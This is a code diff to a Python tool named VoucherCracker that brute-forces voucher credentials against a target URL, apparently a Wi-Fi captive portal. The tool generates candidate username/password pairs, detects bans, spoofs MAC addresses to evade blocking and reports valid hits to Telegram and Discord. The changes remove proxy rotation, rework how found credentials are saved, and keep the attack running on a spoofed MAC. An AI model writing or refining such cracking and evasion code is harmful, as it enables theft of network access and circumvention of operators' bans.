@@ -13,19 +13,6 @@ from core.generator import VoucherGenerator
 from config import SUCCESS_KEYWORDS, FAIL_KEYWORDS, BAN_KEYWORDS
 from utils.network import change_mac, get_current_wifi_info, SourceAddressAdapter
 
-class ProxyManager :
-
-    def __init__(self, proxy_list =None):
-        self.proxies =[p.strip()for p in (proxy_list or [])if p.strip()]
-        self.index =0
-    def get_next(self):
-        if not self.proxies :
-            return None
-        p =self.proxies [self.index %len(self.proxies)]
-        self.index +=1
-        protocol ='socks5'if 'socks5'in p.lower()else 'http'
-        return {'http':f'{protocol}://{p}', 'https':f'{protocol}://{p}'}
-
 class VoucherCracker :
 
     def __init__(self, target_url, auth_mode ='both', session_name ='session',
@@ -37,7 +24,7 @@ class VoucherCracker :
     pass_start ='', pass_end ='', pass_contains ='', pass_letter_case ='lowercase',
     analytic_mode =False, manual_samples ='',
     user_use_luhn =False, pass_use_luhn =False,
-    proxies =None, stealth =False, delay =0, auto_spoof =False,
+    stealth =False, delay =0, auto_spoof =False,
     telegram_token ='', telegram_chat ='',
     discord_webhook ='', discord_token ='', discord_channel ='',
     stop_after =1, bound_adapter_ips =None, **kwargs):
@@ -70,7 +57,6 @@ class VoucherCracker :
         self.pass_use_luhn =pass_use_luhn
 
         self.analytic_mode =analytic_mode
-        self.proxy_mgr =ProxyManager(proxies)
         self.stealth =stealth
         self.delay =float(delay or 0)
         self.auto_spoof =auto_spoof
@@ -241,50 +227,56 @@ class VoucherCracker :
         self.log('[!] Could not send Discord notification - internet unavailable')
 
     def save_valid_pair(self, user, password):
+        """Record a valid credential pair. Lock held only for fast state mutations."""
+        if self.auth_mode == 'username':
+            content = user
+        elif self.auth_mode == 'password':
+            content = password
+        else:
+            content = f'{user}:{password}'
 
-        if self.auth_mode =='username':
-            content =user
-        elif self.auth_mode =='password':
-            content =password
-        else :
-            content =f'{user}:{password}'
+        if not content:
+            self.log('[!] save_valid_pair called with empty content — skipping.')
+            return
 
-        with self.lock :
-
-            if content in self.saved_valid :
+        with self.lock:
+            if content in self.saved_valid:
                 return
-            self.saved_valid .add(content)
-            with open(self.valid_file, 'a')as f :
-                f.write(content +'\n')
-            self.valid_found +=1
-            self.found_valid =True
-            if self.pattern_analyzer :
-                self.pattern_analyzer .add_sample(content)
-            reached_target =(self.valid_found >=self.stop_after)
+            self.saved_valid.add(content)
+            self.valid_found += 1
+            self.found_valid = True
+            reached_target = (self.valid_found >= self.stop_after)
 
-        network_name ='Unknown'
-        adapter_ip =self.bound_adapter_ips [0]if self.bound_adapter_ips else None
-        wifi_info =get_current_wifi_info(adapter_ip)
+        # File I/O and side-effects outside the lock
+        with open(self.valid_file, 'a') as f:
+            f.write(content + '\n')
+        if self.pattern_analyzer:
+            self.pattern_analyzer.add_sample(content)
 
-        network_name =wifi_info.get('ssid')if wifi_info else None
-        if not network_name and adapter_ip and adapter_ip in self.origin_wifi_info :
-            network_name =self.origin_wifi_info [adapter_ip].get('ssid')
-        if not network_name :
-            network_name ='Unknown'
+        network_name = 'Unknown'
+        adapter_ip = self.bound_adapter_ips[0] if self.bound_adapter_ips else None
+        wifi_info = get_current_wifi_info(adapter_ip)
 
-        msg =f'Valid Found!\n{content}\n({self.valid_found}/{self.stop_after})'
+        network_name = wifi_info.get('ssid') if wifi_info else None
+        if not network_name and adapter_ip and adapter_ip in self.origin_wifi_info:
+            network_name = self.origin_wifi_info[adapter_ip].get('ssid')
+        if not network_name:
+            network_name = 'Unknown'
+
+        msg = f'Valid Found!\n{content}\n({self.valid_found}/{self.stop_after})'
         self.send_telegram(msg, network_name)
         self.send_discord(msg, network_name)
 
-        try :
+        try:
             import eel
             eel.on_valid_found(content)()
-        except Exception :
-            pass
+        except Exception as e:
+            import sys
+            print(f"[Eel] on_valid_found error: {e}", file=sys.stderr)
 
-        if reached_target :
-            self.log(f'[+] Reached target: {self.valid_found}/{self.stop_after} valid hits.Stopping.')
-            self.running =False
+        if reached_target:
+            self.log(f'[+] Reached target: {self.valid_found}/{self.stop_after} valid hits. Stopping.')
+            self.running = False
 
     def check_pair(self, user, password):
 
@@ -313,8 +305,6 @@ class VoucherCracker :
             auth_str =base64.b64encode(f'{user}:{password}'.encode()).decode()
             headers ['Authorization']=f'Basic {auth_str}'
 
-        proxy =self.proxy_mgr .get_next()
-
         max_ban_retries =3
         for _attempt in range(max_ban_retries):
             if not self.running :
@@ -338,8 +328,7 @@ class VoucherCracker :
                 headers =headers,
                 timeout =8,
                 allow_redirects =False,
-                verify =False,
-                proxies =proxy)
+                verify =False)
 
                 content =response.text .lower()
 
@@ -433,7 +422,9 @@ class VoucherCracker :
                     reconnected_info =info
 
             if not reconnected_info :
-                self._notify_wrong_network(new_mac, None, adapter_ip)
+                self.log(f'[!] MAC changed for {adapter_ip} but could not verify network. Continuing with spoofed MAC.')
+                with self.lock :
+                    self._spoofing_ips .discard(adapter_ip)
                 return
 
             if reconnected_info ['ssid']==origin_info ['ssid']:
@@ -504,14 +495,20 @@ class VoucherCracker :
                 self.origin_wifi_info [None]=wifi
 
         try :
-            self.sessions [0][0].get(self.target_url, timeout =5, verify =False)
-            self.log('[*] Target reachable.Starting...')
+            self.sessions[0][0].get(self.target_url, timeout=5, verify=False)
+            self.log('[*] Target reachable. Starting...')
         except requests.exceptions.ConnectionError as e:
-            self.log(f'[!] Warning: Target network unreachable — Connection failed: {str(e)[:100]}')
+            self.log(f'[!] Target unreachable — Connection failed: {str(e)[:100]}. Aborting.')
+            self.running = False
+            return
         except requests.exceptions.Timeout:
-            self.log('[!] Warning: Target request timed out (5s).May be slow or unreachable.')
+            self.log('[!] Target unreachable — Request timed out (5s). Aborting.')
+            self.running = False
+            return
         except Exception as e:
-            self.log(f'[!] Warning: Target unreachable — {type(e).__name__}: {str(e)[:100]}')
+            self.log(f'[!] Target unreachable — {type(e).__name__}: {str(e)[:100]}. Aborting.')
+            self.running = False
+            return
 
         try :
             num_adapters =0
@@ -535,8 +532,10 @@ class VoucherCracker :
                         current_total_workers =needed_total_workers
                         executor =concurrent.futures .ThreadPoolExecutor(max_workers =current_total_workers)
 
-                    if len(self.tried_pairs)>1_000_000 :
-                        self.tried_pairs .clear()
+                    if len(self.tried_pairs) > 1_000_000:
+                        # Drop the oldest ~25% to keep the set bounded
+                        # without losing all history
+                        self.tried_pairs = set(list(self.tried_pairs)[250_000:])
 
                     batch =[]
                     failed_gen =0
